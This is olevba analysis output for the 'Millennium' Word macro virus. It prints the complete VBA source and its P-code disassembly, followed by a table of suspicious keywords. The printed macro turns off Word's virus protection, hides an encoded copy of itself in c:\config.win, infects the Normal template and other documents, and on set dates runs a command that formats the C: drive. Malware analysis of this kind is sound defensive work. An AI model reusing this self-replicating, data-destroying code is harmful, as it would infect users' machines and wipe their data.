olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lenni
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Millennium.cls 
in file: Virus.MSWord.Lenni - OLE stream: 'Macros/VBA/Millennium'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Dim nLun As Integer
Dim nCar As Long
Dim CriptLine As String
Static acar() As Variant
eol = Chr(13)
xSave = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
CommandBars("Tools").Controls("Macro").Enabled = False
Randomize
If Dir("c:\config.win", 6) = "" Then
Open "c:\config.win" For Output As #1
For i = 1 To 124
    xLine = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    nLun = Len(xLine)
    ReDim acar(nLun)
    For xCont = 0 To nLun - 1
        acar(xCont) = Mid(xLine, 1, 1)
        xLine = Mid(xLine, 2, Len(xLine))
    Next
    For xConta = 0 To nLun - 1
        nCar = Asc(acar(xConta))
        nCar = nCar + 15
        CriptLine = CriptLine & Chr(nCar)
    Next
    Print #1, CriptLine
    CriptLine = ""
Next
Close #1
CriptLine = ""
SetAttr "c:\config.win", 6
End If
Set actdoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set actdot = NormalTemplate.VBProject.VBComponents.Item(1)
If actdot.Name <> "Millennium" Then
    actdot.Name = "Millennium"
  If actdot.CodeModule.countoflines > 0 Then
      nLine = actdot.CodeModule.countoflines
        For i = 1 To nLine
            actdot.CodeModule.deletelines 1
        Next
        Set xDoc = NormalTemplate.VBProject.VBComponents.Item(1)
        xVar = "n"
  Else
        If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
            Set xDoc = NormalTemplate.VBProject.VBComponents.Item(1)
            xVar = "n"
        End If
  End If
ElseIf actdoc.Name <> "Millennium" Then
        actdoc.Name = "Millennium"
    If actdoc.CodeModule.countoflines > 0 Then
        nLine = actdoc.CodeModule.countoflines
        For i = 1 To nLine
            actdoc.CodeModule.deletelines 1
        Next
        Set xDoc = ActiveDocument.VBProject.VBComponents.Item(1)
        xVar = "d"
    Else
        If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
            Set xDoc = ActiveDocument.VBProject.VBComponents.Item(1)
            xVar = "d"
        End If
    End If
Else
    xDoc = ""
End If
If xDoc <> "" Then
    If xVar = "n" Then
       'Third Sub
       xDoc.CodeModule.addfromstring ("Sub ViewVBCode" & eol & "MsgBox " & Chr(34) & "Microsoft Visual Basic Error in components MsVbRun32.dll." & Chr(34) & ",vbcritical," & Chr(34) & "Microsoft Word" & Chr(34) & eol & "End Sub")
    End If
    Open "c:\config.win" For Input As #1
    If LOF(1) = 0 Then GoTo xEnd
    i = 1
    Do While Not EOF(1)
        Line Input #1, xLine
        nLun = Len(xLine)
        ReDim acar(nLun)
        For xCont = 0 To nLun - 1
            acar(xCont) = Mid(xLine, 1, 1)
            xLine = Mid(xLine, 2, Len(xLine))
        Next
        For xCont = 0 To nLun - 1
            nCar = Asc(acar(xCont))
            nCar = nCar - 15
            CriptLine = CriptLine & Chr(nCar)
        Next
        xDoc.CodeModule.InsertLines i, CriptLine
        CriptLine = ""
        i = i + 1
    Loop
End If
xEnd:
   Close #1
    If Year(Now) = "2000" Then
        scmd$ = "echo y|format c: /u"
        If Day(Now) = 1 And Month(Date) = 1 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       ElseIf Day(Now) = 10 And Month(Date) = 1 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       End If
       If Day(Now) = 20 And Month(Date) = 1 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       ElseIf Day(Now) = 4 And Month(Date) = 8 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       End If
       If Day(Now) = 31 And Month(Date) = 10 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       ElseIf Day(Now) = 1 And Month(Date) = 4 Then
            Shell Environ$("COMSPEC") + " /c " + scmd$, 0
            MsgBox "Alert..!! Your Pc have a serious problem with the Year 2000", vbCritical, "-= MILLENNIUM VIRUS =-"
       End If
    End If
    'Forcing save
    If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Lenni
' ===============================================================================
' Module streams:
' Macros/VBA/Millennium - 8135 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn nLun (As Integer)
' Line #3:
' 	Dim 
' 	VarDefn nCar (As Long)
' Line #4:
' 	Dim 
' 	VarDefn CriptLine (As String)
' Line #5:
' 	Dim (Static) 
' 	VarDefn acar (As Variant)
' Line #6:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	St eol 
' Line #7:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St xSave 
' Line #8:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #10:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitStr 0x000D "c:\config.win"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitStr 0x000D "c:\config.win"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x007C 
' 	For 
' Line #15:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St xLine 
' Line #16:
' 	Ld xLine 
' 	FnLen 
' 	St nLun 
' Line #17:
' 	OptionBase 
' 	Ld nLun 
' 	Redim acar 0x0001 (As Variant)
' Line #18:
' 	StartForVariable 
' 	Ld xCont 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld nLun 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #19:
' 	Ld xLine 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld xCont 
' 	ArgsSt acar 0x0001 
' Line #20:
' 	Ld xLine 
' 	LitDI2 0x0002 
' 	Ld xLine 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	St xLine 
' Line #21:
' 	StartForVariable 
' 	Next 
' Line #22:
' 	StartForVariable 
' 	Ld xConta 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld nLun 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #23:
' 	Ld xConta 
' 	ArgsLd acar 0x0001 
' 	ArgsLd Asc 0x0001 
' 	St nCar 
' Line #24:
' 	Ld nCar 
' 	LitDI2 0x000F 
' 	Add 
' 	St nCar 
' Line #25:
' 	Ld CriptLine 
' 	Ld nCar 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St CriptLine 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld CriptLine 
' 	PrintItemNL 
' Line #28:
' 	LitStr 0x0000 ""
' 	St CriptLine 
' Line #29:
' 	StartForVariable 
' 	Next 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #31:
' 	LitStr 0x0000 ""
' 	St CriptLine 
' Line #32:
' 	LitStr 0x000D "c:\config.win"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set actdoc 
' Line #35:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set actdot 
' Line #36:
' 	Ld actdot 
' 	MemLd New 
' 	LitStr 0x000A "Millennium"
' 	Ne 
' 	IfBlock 
' Line #37:
' 	LitStr 0x000A "Millennium"
' 	Ld actdot 
' 	MemSt New 
' Line #38:
' 	Ld actdot 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #39:
' 	Ld actdot 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St nLine 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nLine 
' 	For 
' Line #41:
' 	LitDI2 0x0001 
' 	Ld actdot 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0001 
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xDoc 
' Line #44:
' 	LitStr 0x0001 "n"
' 	St xVar 
' Line #45:
' 	ElseBlock 
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #47:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xDoc 
' Line #48:
' 	LitStr 0x0001 "n"
' 	St xVar 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Ld actdoc 
' 	MemLd New 
' 	LitStr 0x000A "Millennium"
' 	Ne 
' 	ElseIfBlock 
' Line #52:
' 	LitStr 0x000A "Millennium"
' 	Ld actdoc 
' 	MemSt New 
' Line #53:
' 	Ld actdoc 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #54:
' 	Ld actdoc 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St nLine 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nLine 
' 	For 
' Line #56:
' 	LitDI2 0x0001 
' 	Ld actdoc 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0001 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xDoc 
' Line #59:
' 	LitStr 0x0001 "d"
' 	St xVar 
' Line #60:
' 	ElseBlock 
' Line #61:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #62:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xDoc 
' Line #63:
' 	LitStr 0x0001 "d"
' 	St xVar 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	ElseBlock 
' Line #67:
' 	LitStr 0x0000 ""
' 	St xDoc 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	Ld xDoc 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #70:
' 	Ld xVar 
' 	LitStr 0x0001 "n"
' 	Eq 
' 	IfBlock 
' Line #71:
' 	QuoteRem 0x0007 0x0009 "Third Sub"
' Line #72:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Concat 
' 	LitStr 0x0007 "MsgBox "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0039 "Microsoft Visual Basic Error in components MsVbRun32.dll."
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C ",vbcritical,"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000E "Microsoft Word"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld eol 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	Ld xDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	LitStr 0x000D "c:\config.win"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #75:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo xEnd 
' 	EndIf 
' Line #76:
' 	LitDI2 0x0001 
' 	St i 
' Line #77:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #78:
' 	LitDI2 0x0001 
' 	Ld xLine 
' 	LineInput 
' Line #79:
' 	Ld xLine 
' 	FnLen 
' 	St nLun 
' Line #80:
' 	OptionBase 
' 	Ld nLun 
' 	Redim acar 0x0001 (As Variant)
' Line #81:
' 	StartForVariable 
' 	Ld xCont 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld nLun 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #82:
' 	Ld xLine 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld xCont 
' 	ArgsSt acar 0x0001 
' Line #83:
' 	Ld xLine 
' 	LitDI2 0x0002 
' 	Ld xLine 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	St xLine 
' Line #84:
' 	StartForVariable 
' 	Next 
' Line #85:
' 	StartForVariable 
' 	Ld xCont 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld nLun 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #86:
' 	Ld xCont 
' 	ArgsLd acar 0x0001 
' 	ArgsLd Asc 0x0001 
' 	St nCar 
' Line #87:
' 	Ld nCar 
' 	LitDI2 0x000F 
' 	Sub 
' 	St nCar 
' Line #88:
' 	Ld CriptLine 
' 	Ld nCar 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St CriptLine 
' Line #89:
' 	StartForVariable 
' 	Next 
' Line #90:
' 	Ld i 
' 	Ld CriptLine 
' 	Ld xDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #91:
' 	LitStr 0x0000 ""
' 	St CriptLine 
' Line #92:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #93:
' 	Loop 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	Label xEnd 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #97:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitStr 0x0004 "2000"
' 	Eq 
' 	IfBlock 
' Line #98:
' 	LitStr 0x0013 "echo y|format c: /u"
' 	St scmd$ 
' Line #99:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #100:
' 	LitStr 0x0007 "COMSPEC"
' 	ArgsLd Environ$ 0x0001 
' 	LitStr 0x0004 " /c "
' 	Add 
' 	Ld scmd$ 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #101:
' 	LitStr 0x003B "Alert..!! Your Pc have a serious problem with the Year 2000"
' 	Ld vbCritical 
' 	LitStr 0x0016 "-= MILLENNIUM VIRUS =-"
' 	ArgsCall MsgBox 0x0003 
' Line #102:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #103:
' 	LitStr 0x0007 "COMSPEC"
' 	ArgsLd Environ$ 0x0001 
' 	LitStr 0x0004 " /c "
' 	Add 
' 	Ld scmd$ 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #104:
' 	LitStr 0x003B "Alert..!! Your Pc have a serious problem with the Year 2000"
' 	Ld vbCritical 
' 	LitStr 0x0016 "-= MILLENNIUM VIRUS =-"
' 	ArgsCall MsgBox 0x0003 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #107:
' 	LitStr 0x0007 "COMSPEC"
' 	ArgsLd Environ$ 0x0001 
' 	LitStr 0x0004 " /c "
' 	Add 
' 	Ld scmd$ 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #108:
' 	LitStr 0x003B "Alert..!! Your Pc have a serious problem with the Year 2000"
' 	Ld vbCritical 
' 	LitStr 0x0016 "-= MILLENNIUM VIRUS =-"
' 	ArgsCall MsgBox 0x0003 
' Line #109:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #110:
' 	LitStr 0x0007 "COMSPEC"
' 	ArgsLd Environ$ 0x0001 
' 	LitStr 0x0004 " /c "
' 	Add 
' 	Ld scmd$ 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #111:
' 	LitStr 0x003B "Alert..!! Your Pc have a serious problem with the Year 2000"
' 	Ld vbCritical 
' 	LitStr 0x0016 "-= MILLENNIUM VIRUS =-"
' 	ArgsCall MsgBox 0x0003 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #114:
' 	LitStr 0x0007 "COMSPEC"
' 	ArgsLd Environ$ 0x0001 
' 	LitStr 0x0004 " /c "
' 	Add 
' 	Ld scmd$ 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #115:
' 	LitStr 0x003B "Alert..!! Your Pc have a serious problem with the Year 2000"
' 	Ld vbCritical 
' 	LitStr 0x0016 "-= MILLENNIUM VIRUS =-"
' 	ArgsCall MsgBox 0x0003 
' Line #116:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #117:
' 	LitStr 0x0007 "COMSPEC"
' 	ArgsLd Environ$ 0x0001 
' 	LitStr 0x0004 " /c "
' 	Add 
' 	Ld scmd$ 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #118:
' 	LitStr 0x003B "Alert..!! Your Pc have a serious problem with the Year 2000"
' 	Ld vbCritical 
' 	LitStr 0x0016 "-= MILLENNIUM VIRUS =-"
' 	ArgsCall MsgBox 0x0003 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	QuoteRem 0x0004 0x000C "Forcing save"
' Line #122:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #123:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MsVbRun32.dll       |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

